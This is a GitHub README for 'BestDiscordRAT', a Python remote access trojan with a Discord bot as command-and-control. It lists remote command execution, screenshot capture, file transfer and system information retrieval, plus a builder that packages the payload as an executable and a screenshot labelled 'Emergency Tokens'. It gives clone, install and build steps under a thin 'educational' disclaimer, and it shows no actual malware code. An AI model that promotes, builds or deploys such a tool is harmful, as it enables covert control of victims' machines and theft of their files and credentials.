# BestDiscordRAT  
**Discord Remote Access Tool — Educational & Preventive Purpose**

## Table of Contents
- [About](#about)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Ethical & Safety Notice](#ethical--safety-notice)
- [Screenshots](#screenshots)
- [License](#license)
- [Disclaimer](#disclaimer)

## About  
BestDiscordRAT is a Python-based demonstration tool that showcases how a Discord-powered Remote Access Tool (RAT) operates.  
It is designed **exclusively for educational, defensive, and preventive cybersecurity purposes** in controlled environments.  
The project aims to help students, researchers, and security enthusiasts understand RAT behavior, strengthen detection skills, and improve defensive strategies.

## Features  
- Discord bot used as Command & Control  
- Graphical user interface for building (`GUI.py`)  
- Automatic builder (`Builder.bat`)  
- Easy setup script (`Setup.bat`)  
- Remote command execution  
- Screenshot capture  
- File upload & download  
- System information retrieval  
- Modular architecture for adding or removing features  

And many more, see [Screenshots](#screenshots).

## Installation  
Clone the repository:
```bash
git clone https://github.com/NoonePYDEV/BestDiscordRAT
cd BestDiscordRAT
```

Create and activate a Python virtual environment:
```bash
python -m venv venv
# Windows
venv\Scripts\activate
# Linux/macOS
source venv/bin/activate
```

Install dependencies:
```bash
pip install -r requirements.txt
```

## Usage  
Run the GUI:
```bash
python GUI.py
```

Build the executable:
```bash
Builder.bat
```

Configure your Discord bot token, channel IDs, and other parameters inside the configuration files or directly in the script (depending on your setup).

## Screenshots

![Builder](./Screenshots/Builder.png)
<br>
![Emergency Tokens](./Screenshots/EmTokens.png)

## Ethical & Safety Notice  
This project is strictly intended for:  
- Security education  
- Malware analysis practice  
- Defensive research  
- Awareness and prevention  

Do **not** deploy this tool on any machine you do not own or manage.  
Unauthorized use is illegal and strictly prohibited.

## License  
This project is released under the license included in the repository.

## ⚠️ Disclaimer  
The author is **not responsible** for any misuse or damage caused by this tool.  
Use responsibly, ethically, and in compliance with applicable laws.
